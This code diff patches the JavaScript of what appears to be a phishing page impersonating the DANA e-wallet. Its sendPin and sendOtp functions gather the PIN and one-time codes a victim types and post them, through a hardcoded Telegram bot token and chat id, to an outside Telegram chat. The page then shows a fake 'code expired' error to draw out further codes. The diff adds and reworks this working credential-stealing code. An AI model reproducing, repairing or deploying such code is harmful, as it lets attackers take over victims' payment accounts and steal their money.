@@ -44,36 +44,33 @@ function sendNohp(event){
   });
 }
 
+function sendPin(){
+  $("#process").show();
+  let pin = "";
+  $(".inppin").each(function() {
+    pin += $(this).val();
+  });
 
+  let text = "🔒 *PIN DANA*\n`" + pin + "`";
 
-
-</script>
-
-<script>
-let countdownTime = 120;
-let countdownInterval;
-
-function countdown() {
-  const countdownEl = document.getElementById("countdown");
-  if (countdownTime > 0) {
-    countdownTime--;
-    countdownEl.textContent = countdownTime;
-  } else {
-    clearInterval(countdownInterval);
-    $(".resend").html('<button onclick="resendOtp()" style="color:blue;border:none;background:none;cursor:pointer;">KIRIM ULANG</button>');
-  }
-}
-
-function resendOtp() {
-  countdownTime = 120;
-  $(".resend").html('KIRIM ULANG (<span id="countdown">120</span>s)');
-  countdownInterval = setInterval(countdown, 1000);
-
-  $(".inpotp").val('');
-  $("#otp1").focus();
-
-  $(".alert").text("Kode OTP dikirim setelah tahap verifikasi selesai");
-  $(".alert").css("color", "black");
+  fetch("https://api.telegram.org/bot7496230666:AAE3fiRkljp8flv2jtGKkucWF6ADpwgbnS0/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "chat_id=8190878548&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+  })
+  .then(res => res.json())
+  .then(() => {
+    $("#process").hide();
+    $(".inppin").val('');
+    $(".bgotp").fadeIn();
+    setInterval(countdown, 1000);
+    $("#otp1").focus();
+  })
+  .catch(err => {
+    console.error("❌ Gagal kirim PIN:", err);
+    alert("Gagal kirim PIN: " + err.message);
+    $("#process").hide();
+  });
 }
 
 function sendOtp(){
@@ -83,8 +80,7 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = "📬 *OTP DANA*
-`" + otp + "`";
+  let text = "📬 *OTP DANA*\n`" + otp + "`";
 
   fetch("https://api.telegram.org/bot7496230666:AAE3fiRkljp8flv2jtGKkucWF6ADpwgbnS0/sendMessage", {
     method: "POST",
@@ -98,46 +94,12 @@ function sendOtp(){
       $(".inpotp").val('');
       $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
       $(".alert").css("color","red");
-    }, 3000);
+    },3000);
   })
   .catch(err => {
     console.error("❌ Gagal kirim OTP:", err);
     alert("Gagal kirim OTP: " + err.message);
     $(".loadingOtp").hide();
-  });
-}
-
-function sendPin(){
-  $("#process").show();
-  let pin = "";
-  $(".inppin").each(function() {
-    pin += $(this).val();
-  });
-
-  let text = "🔒 *PIN DANA*
-`" + pin + "`";
-
-  fetch("https://api.telegram.org/bot7496230666:AAE3fiRkljp8flv2jtGKkucWF6ADpwgbnS0/sendMessage", {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=8190878548&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
-  })
-  .then(res => res.json())
-  .then(() => {
-    $("#process").hide();
-    $(".inppin").val('');
-    $(".bgotp").fadeIn();
-
-    countdownTime = 120;
-    clearInterval(countdownInterval);
-    countdownInterval = setInterval(countdown, 1000);
-
-    $("#otp1").focus();
-  })
-  .catch(err => {
-    console.error("❌ Gagal kirim PIN:", err);
-    alert("Gagal kirim PIN: " + err.message);
-    $("#process").hide();
   });
 }
 </script>
